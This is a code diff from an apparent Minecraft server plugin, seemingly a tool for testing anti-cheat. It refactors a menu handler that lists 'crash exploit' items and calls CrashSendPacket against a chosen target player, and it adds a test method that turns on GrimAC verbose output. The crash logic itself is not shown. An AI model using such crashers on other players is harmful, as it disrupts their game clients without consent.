+						// TODO Move this
 						if (ItemName.equalsIgnoreCase("spawn entity crashers"))
 						{
-							player.closeInventory();
-							inventory = PT.createInventory(player, 9, ChatColor.RED + "Spawn Entity Crashers");
-							item = Reset(new ItemStack(Material.WOOL, 1, (short) 14));
-							itemMeta.setDisplayName(ChatColor.BLUE + "Back");
-							lore.add("takes you back to the");
-							lore.add("crashers menu.");
-							itemMeta.setLore(lore);
-							item.setItemMeta(itemMeta);
-							inventory.setItem(0, item);
-							
-							item = Reset(new ItemStack(Material.SKULL_ITEM, 1, (short) 4));
-							itemMeta.setDisplayName(ChatColor.RED + "Creeper");
-							lore.add("Creeper Crash Exploit!");
-							lore.add("");
-							lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
-							itemMeta.setLore(lore);
-							item.setItemMeta(itemMeta);
-							inventory.setItem(1, item);
-							
-							item = Reset(new ItemStack(Material.MOB_SPAWNER));
-							itemMeta.setDisplayName(ChatColor.RED + "Test");
-							lore.add("Test Crash Exploit!");
-							itemMeta.setLore(lore);
-							item.setItemMeta(itemMeta);
-							inventory.setItem(2, item);
-							
-							player.openInventory(inventory);
+							user.getPlayer().openInventory(user.getSpawnEntityCrashers());
 							e.setCancelled(true);
 							return;
 						}
-						CrashSendPacket(Menu.sender, Menu.player, ItemName, null);
+						CrashSendPacket(user.getPlayer(), user.CommandTarget, ItemName, null);
 						e.setCancelled(true);
 					}
 				}
 				if (MenuName.equalsIgnoreCase("Spawn Entity Crashers"))
 				{
-					if (ItemName != null)
+					if (ItemName != null && e.getClickedInventory() != user.getPlayer().getInventory())
 					{
 						if (ItemName.equalsIgnoreCase("Back"))
 						{
 							e.setCancelled(true);
-							player.closeInventory();
+							user.getPlayer().closeInventory();
 							Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getGetMain(), new Runnable()
 				            {
 				                @Override
 				                public void run()
 				                {
-				                	Command(player, "menu crashers " + Menu.player.getName());
+				                	Command(BackUser.getPlayer(), "menu crashers " + BackUser.CommandTarget);
 				                }
-				            }, 2L);
+				            }, 1L);
 							return;
 						}
-						CrashSendPacket(Menu.sender, Menu.player, "SpawnEntity", ItemName);
+						CrashSendPacket(user.getPlayer(), user.CommandTarget, "SpawnEntity", ItemName);
 						e.setCancelled(true);
 					}
 				}
 			}
+		}
+	}
+	// This is a TEST!
+	public static void ShowFlags (User user)
+	{
+		if (user == null) return;
+		
+		String AntiCheat = ChatColor.stripColor(user.AntiCheat).toLowerCase();
+		
+		/*
+		if (!AntiCheat.equalsIgnoreCase("grimac") && user.AlertsEnabled.containsKey("grimac") && user.AlertsEnabled.get("grimac"))
+			Bukkit.dispatchCommand(user.getPlayer(), "grim verbose");
+		
+		if (user.AlertsEnabled.containsKey(AntiCheat))
+			user.AlertsEnabled.remove(AntiCheat);
+		*/
+		switch (AntiCheat)
+		{
+		case "grimac":
+			Bukkit.dispatchCommand(user.getPlayer(), "grim verbose");
+			//user.AlertsEnabled.put(AntiCheat, true);
+			break;
+		
+		default:
+			break;
 		}
 	}
 }
